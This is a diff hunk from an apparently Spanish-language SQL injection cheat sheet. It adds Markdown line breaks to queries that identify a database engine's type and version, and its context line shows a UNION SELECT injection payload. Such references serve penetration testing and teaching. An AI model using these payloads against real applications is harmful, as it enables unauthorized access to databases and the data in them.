@@ -44,9 +44,9 @@ metodo_2: ' UNION SELECT NULL--
 
 ### IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS [TIPO/VERSION] 
 
-Microsoft >> SELECT @@version 
-MySQL >> SELECT @@version 
-Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance 
+Microsoft >> SELECT @@version \
+MySQL >> SELECT @@version \
+Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance \
 PostgreSQL >> SELECT version() 
 
 ### LISTAR TABLAS DE LA BASE DE DATOS / [Microsoft/MySQL/PostgreSQL] 
